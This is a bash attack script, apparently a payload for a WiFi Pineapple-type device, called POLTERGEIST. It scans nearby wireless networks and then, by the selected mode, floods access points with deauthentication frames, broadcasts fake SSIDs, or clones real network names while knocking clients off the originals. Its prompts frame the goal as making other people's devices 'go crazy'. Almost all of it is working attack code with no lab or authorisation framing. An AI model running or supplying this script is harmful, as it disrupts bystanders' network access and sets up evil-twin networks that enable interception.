#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# POLTERGEIST - Packet Overload Leveraging Targeted Exploitation & RF Ghosting
# Developed by: bad-antics
# 
# Makes devices behave erratically - random disconnects, weird SSIDs appearing
#═══════════════════════════════════════════════════════════════════════════════

source /mmc/nullsec/lib/nullsec-scanner.sh 2>/dev/null

LOOT_DIR="/mmc/nullsec/poltergeist"
mkdir -p "$LOOT_DIR"

PROMPT "╔═╗╔═╗╦  ╔╦╗╔═╗╦═╗╔═╗╔═╗╦╔═╗╔╦╗
╠═╝║ ║║   ║ ║╣ ╠╦╝║ ╦║╣ ║╚═╗ ║ 
╩  ╚═╝╩═╝ ╩ ╚═╝╩╚═╚═╝╚═╝╩╚═╝ ╩ 
━━━━━━━━━━━━━━━━━━━━━━━━━
Wireless Haunting System

Make their devices
go crazy. Random drops,
ghost networks appear,
connections fail.

PURE CHAOS.
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"

PROMPT "HAUNTING MODES:

1. Flicker (random deauths)
2. Apparition (ghost SSIDs)
3. Possession (clone & kick)
4. Full Haunting (ALL)

How severe should
the haunting be?"

MODE=$(NUMBER_PICKER "Mode (1-4):" 4)
INTENSITY=$(NUMBER_PICKER "Intensity (1-10):" 5)
DURATION=$(NUMBER_PICKER "Duration (sec):" 120)

INTERFACE="wlan0"
airmon-ng check kill 2>/dev/null
airmon-ng start $INTERFACE >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

LOOT_FILE="$LOOT_DIR/poltergeist_$(date +%Y%m%d_%H%M%S).txt"
cat > "$LOOT_FILE" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 POLTERGEIST - Haunting Log
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Started: $(date)
 Mode: $MODE | Intensity: $INTENSITY | Duration: ${DURATION}s
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ACTIVITY:
EOF

LOG "Poltergeist awakening..."
SPINNER_START "Haunting the wireless realm..."

# First, scan for targets
TEMP_SCAN="/tmp/poltergeist_scan"
timeout 10 airodump-ng $MON_IF -w "$TEMP_SCAN" --output-format csv 2>/dev/null &
sleep 10

# Parse targets
TARGETS=$(grep -E "^[0-9A-Fa-f]{2}:" "${TEMP_SCAN}-01.csv" 2>/dev/null | head -10)

# Ghost SSID list
GHOST_SSIDS=(
    "FBI Surveillance Van #"
    "NSA_PRISM_Node_"
    "Virus Detected - "
    "Your WiFi is Haunted "
    "HACKED_"
    "404 Network Not Found "
    "Loading... "
    "I Can See You "
    "Get Off My LAN "
    "It Follows "
    "The Ring "
    "Paranormal Activity "
)

flicker_attack() {
    # Random deauths to random targets
    echo "$TARGETS" | while IFS=',' read BSSID REST; do
        BSSID=$(echo "$BSSID" | tr -d ' ')
        [ -z "$BSSID" ] && continue
        CH=$(echo "$REST" | cut -d',' -f3 | tr -d ' ')
        
        # Random chance based on intensity
        if [ $((RANDOM % 10)) -lt $INTENSITY ]; then
            iwconfig $MON_IF channel $CH 2>/dev/null
            aireplay-ng --deauth $((RANDOM % 5 + 1)) -a $BSSID $MON_IF 2>/dev/null &
            echo "[$(date '+%H:%M:%S')] FLICKER: Deauth $BSSID" >> "$LOOT_FILE"
            sleep 0.$((RANDOM % 5))
        fi
    done
}

apparition_attack() {
    # Spawn ghost SSIDs
    > /tmp/ghost_ssids.txt
    for i in $(seq 1 $((INTENSITY * 3))); do
        GHOST="${GHOST_SSIDS[$((RANDOM % ${#GHOST_SSIDS[@]}))]}"
        echo "${GHOST}${RANDOM:0:3}" >> /tmp/ghost_ssids.txt
    done
    
    if command -v mdk4 &>/dev/null; then
        timeout 30 mdk4 $MON_IF b -f /tmp/ghost_ssids.txt -s $((INTENSITY * 100)) 2>/dev/null &
    elif command -v mdk3 &>/dev/null; then
        timeout 30 mdk3 $MON_IF b -f /tmp/ghost_ssids.txt -s $((INTENSITY * 100)) 2>/dev/null &
    fi
    echo "[$(date '+%H:%M:%S')] APPARITION: Spawned $(wc -l < /tmp/ghost_ssids.txt) ghost networks" >> "$LOOT_FILE"
}

possession_attack() {
    # Clone SSID and deauth original
    echo "$TARGETS" | head -3 | while IFS=',' read BSSID F2 F3 CH F5 F6 F7 F8 F9 F10 F11 F12 F13 ESSID REST; do
        BSSID=$(echo "$BSSID" | tr -d ' ')
        ESSID=$(echo "$ESSID" | tr -d ' ')
        CH=$(echo "$CH" | tr -d ' ')
        [ -z "$ESSID" ] && continue
        
        # Create evil clone
        echo "$ESSID" >> /tmp/possessed.txt
        echo "$ESSID" >> /tmp/possessed.txt
        echo "$ESSID" >> /tmp/possessed.txt
        
        echo "[$(date '+%H:%M:%S')] POSSESSION: Cloning $ESSID" >> "$LOOT_FILE"
        
        # Deauth original
        iwconfig $MON_IF channel $CH 2>/dev/null
        aireplay-ng --deauth 5 -a $BSSID $MON_IF 2>/dev/null &
    done
    
    if command -v mdk4 &>/dev/null; then
        timeout 30 mdk4 $MON_IF b -f /tmp/possessed.txt -s 500 2>/dev/null &
    fi
}

END_TIME=$(($(date +%s) + DURATION))

while [ $(date +%s) -lt $END_TIME ]; do
    case $MODE in
        1) flicker_attack ;;
        2) apparition_attack; sleep 5 ;;
        3) possession_attack; sleep 10 ;;
        4)
            flicker_attack
            apparition_attack
            possession_attack
            ;;
    esac
    sleep 2
done

SPINNER_STOP

# Kill all
pkill -f "mdk\|aireplay" 2>/dev/null

EVENTS=$(grep -c "^\[" "$LOOT_FILE" 2>/dev/null || echo 0)

cat >> "$LOOT_FILE" << EOF

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 HAUNTING COMPLETE
 Events: $EVENTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

# Cleanup
rm -f /tmp/ghost_ssids.txt /tmp/possessed.txt /tmp/poltergeist_*
airmon-ng stop $MON_IF 2>/dev/null

PROMPT "POLTERGEIST DORMANT
━━━━━━━━━━━━━━━━━━━━━━━━━
The haunting ends.

Mode: $MODE
Intensity: $INTENSITY/10
Events: $EVENTS

Chaos was sown.

━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"
